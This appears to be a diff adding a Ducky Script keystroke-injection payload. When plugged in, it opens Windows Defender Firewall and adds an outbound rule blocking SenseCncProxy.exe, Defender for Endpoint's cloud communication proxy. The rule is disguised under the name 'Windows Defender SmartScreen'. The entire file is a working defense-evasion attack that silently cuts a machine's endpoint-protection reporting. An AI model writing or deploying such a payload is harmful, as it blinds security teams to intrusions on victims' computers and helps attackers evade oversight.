@@ -1,0 +1,29 @@
+REM Add Outbound Rule to Windows Defender Firewall blocking outbound connections for the program
+REM Author: Deviant
+DELAY 1000
+GUI r
+DELAY 300
+STRING wf.msc
+ENTER
+DELAY 300
+O
+DELAY 300
+MENU
+DELAY 100
+N
+DELAY 200
+ENTER
+DELAY 200
+STRING %ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe
+DELAY 300
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 300
+STRING Windows Defender SmartScreen
+DELAY 200
+ENTER
+DELAY 200
+ALT F4
